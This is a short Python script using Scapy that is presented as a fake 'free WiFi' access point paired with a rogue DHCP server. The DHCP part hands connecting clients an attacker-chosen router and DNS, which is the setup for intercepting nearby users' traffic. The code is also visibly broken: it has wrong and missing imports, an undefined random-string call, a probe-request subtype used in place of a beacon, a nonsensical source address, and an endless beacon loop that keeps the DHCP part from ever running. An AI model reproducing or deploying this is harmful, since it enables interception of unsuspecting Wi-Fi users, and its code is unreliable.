from scapy.layers.l2 import Ether, Dot11
from scapy.layers.dhcp import DHCP

# Configure your fake AP parameters
essid = "free WiFi"
channel = 1
bssid = "00:11:22:33:44:55"

# Configure your DHCP server parameters
ip_range = ["10.0.0.2", "10.0.0.254"]
netmask = "255.255.255.0"
router = "10.0.0.1"
dns = "8.8.8.8"

def create_ap():
    # Create a new interface for the AP
    ap_iface = "wlan0mon"

    # Start the AP
    ap_packet = Dot11(type=0, subtype=4, addr1=bssid, addr2="ff:ff:ff:ff:ff:ff", addr3=bssid)/\
                 Dot11Beacon(cap="ESS")/\
                 Dot11Elt(ID="SSID", len=len(essid), info=essid)/\
                 Dot11Elt(ID="RSN", info=scapy.randstr(32))

    sendp(ap_packet, iface=ap_iface, inter=0.1, loop=1)

def create_dhcp_server():
    # Start the DHCP server
    dhcp_packet = Ether(src=bssid, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src="10.0.0.1", dst="255.255.255.255")/\
                  UDP(sport=67, dport=68)/\
                  BOOTP(op=2, yiaddr="10.0.0.2")/\
                  DHCP(options=[("message-type", "offer"),
                                ("server_id", "10.0.0.1"),
                                ("param_req_list", ""),
                                ("subnet_mask", netmask),
                                ("router", router),
                                ("domain_name_server", dns),
                                ("lease_time", 600)])

    while True:
        dhcp_packet.getlayer(IP).src = RandShort()
        sendp(dhcp_packet, iface="eth0")

# Start the AP and DHCP server
create_ap()
create_dhcp_server()
